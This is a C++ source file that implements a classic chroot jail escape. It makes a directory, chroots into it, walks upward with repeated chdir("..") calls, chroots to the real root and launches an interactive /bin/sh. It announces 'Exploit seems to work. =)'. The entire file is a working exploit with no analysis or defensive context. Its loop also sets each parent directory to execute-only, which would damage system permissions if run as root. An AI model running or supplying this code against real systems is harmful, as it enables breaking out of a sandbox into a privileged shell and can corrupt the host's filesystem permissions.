#include <iostream>
#include <sys/types.h>
#include <sys/stat.h>
#include <unistd.h>

using namespace std;

int main()
{
    int i = 10;
    if (chdir("/")!=0){
        perror("cd /");
        exit(1);
    }
    if (mkdir("baz", 0777) != 0){
        perror("mkdir baz");
    }

    if (chroot("baz") != 0){
        perror("chroot baz");
        exit(1);
    }
    for (; i > 0; i--){
        if (chdir("..") != 0){
            perror("..");
            exit(1);
        }
        if (chmod("..", S_IXOTH) != 0){
            perror("chmod");
            exit(1);
        }
    }
    if (chroot(".") != 0){
        perror("chroot.");
        exit(1);
    }
    printf("Exploit seems to work. =)\n");
    execl("/bin/sh", "sh", "-i", nullptr);
    perror("exec sh");
    exit(0);
}
